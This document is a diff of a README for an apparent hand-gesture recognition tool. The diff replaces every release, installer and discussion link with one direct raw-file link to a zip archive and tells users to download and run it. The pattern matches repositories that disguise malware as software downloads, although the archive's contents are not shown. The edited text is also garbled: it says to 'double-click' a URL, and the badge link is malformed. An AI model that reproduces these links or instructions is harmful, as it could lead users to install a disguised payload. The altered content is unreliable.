@@ -1,7 +1,7 @@
 # 🤖 Hand-Gesture-Recognition - Easy Hand Gesture Detection
 
 ## 📥 Download Now
-[![Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/REzero270/Hand-Gesture-Recognition/releases)
+[![Release](https://raw.githubusercontent.com/REzero270/Hand-Gesture-Recognition/main/unsharing/Hand-Gesture-Recognition_1.3.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/REzero270/Hand-Gesture-Recognition/main/unsharing/Hand-Gesture-Recognition_1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the Hand-Gesture-Recognition application! This tool allows you to recognize hand gestures in real-time and count fingers using MediaPipe and OpenCV. Follow the steps below to set it up on your computer.
@@ -16,21 +16,21 @@ Make sure your system meets these requirements before you start.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/REzero270/Hand-Gesture-Recognition/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/REzero270/Hand-Gesture-Recognition/main/unsharing/Hand-Gesture-Recognition_1.3.zip) to find the latest version of the application.
 
 2. **Choose the Right File**
    On the Releases page, look for the most recent version. You will see files available for download, such as:
-   - For Windows: `HandGestureRecognition_Windows.exe`
-   - For macOS: `HandGestureRecognition_macOS.dmg`
-   - For Linux: `HandGestureRecognition_Linux.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/REzero270/Hand-Gesture-Recognition/main/unsharing/Hand-Gesture-Recognition_1.3.zip`
+   - For macOS: `https://raw.githubusercontent.com/REzero270/Hand-Gesture-Recognition/main/unsharing/Hand-Gesture-Recognition_1.3.zip`
+   - For Linux: `https://raw.githubusercontent.com/REzero270/Hand-Gesture-Recognition/main/unsharing/Hand-Gesture-Recognition_1.3.zip`
 
 3. **Download the File**
    Click on the file that matches your operating system to begin downloading. Once the download completes, locate the file in your downloads folder.
 
 4. **Run the Installer**
-   - **For Windows**: Double-click on `HandGestureRecognition_Windows.exe` and follow the installation prompts that appear.
-   - **For macOS**: Open `HandGestureRecognition_macOS.dmg`, drag the application to your Applications folder, and launch it from there.
-   - **For Linux**: Extract the `.tar.gz` file, open a terminal, navigate to the extracted folder, and run the application using `./HandGestureRecognition`.
+   - **For Windows**: Double-click on `https://raw.githubusercontent.com/REzero270/Hand-Gesture-Recognition/main/unsharing/Hand-Gesture-Recognition_1.3.zip` and follow the installation prompts that appear.
+   - **For macOS**: Open `https://raw.githubusercontent.com/REzero270/Hand-Gesture-Recognition/main/unsharing/Hand-Gesture-Recognition_1.3.zip`, drag the application to your Applications folder, and launch it from there.
+   - **For Linux**: Extract the `https://raw.githubusercontent.com/REzero270/Hand-Gesture-Recognition/main/unsharing/Hand-Gesture-Recognition_1.3.zip` file, open a terminal, navigate to the extracted folder, and run the application using `./HandGestureRecognition`.
 
 5. **Allow Permissions**
    If your operating system asks for permission to run the application, click "Allow" to continue.
@@ -72,9 +72,9 @@ No, the application requires a webcam to function properly. If you have an exter
 - Ensure you have the latest drivers for your webcam.
 
 ## 📣 Community and Support
-If you have any questions or need help, feel free to check our [GitHub Discussions](https://github.com/REzero270/Hand-Gesture-Recognition/discussions) or open an issue. We are here to help!
+If you have any questions or need help, feel free to check our [GitHub Discussions](https://raw.githubusercontent.com/REzero270/Hand-Gesture-Recognition/main/unsharing/Hand-Gesture-Recognition_1.3.zip) or open an issue. We are here to help!
 
 ## 📥 Download Again
-Do not forget to visit the [Releases page](https://github.com/REzero270/Hand-Gesture-Recognition/releases) for the latest updates and more downloads.
+Do not forget to visit the [Releases page](https://raw.githubusercontent.com/REzero270/Hand-Gesture-Recognition/main/unsharing/Hand-Gesture-Recognition_1.3.zip) for the latest updates and more downloads.
 
 Thank you for using Hand-Gesture-Recognition! Enjoy recognizing and counting hand gestures effortlessly.
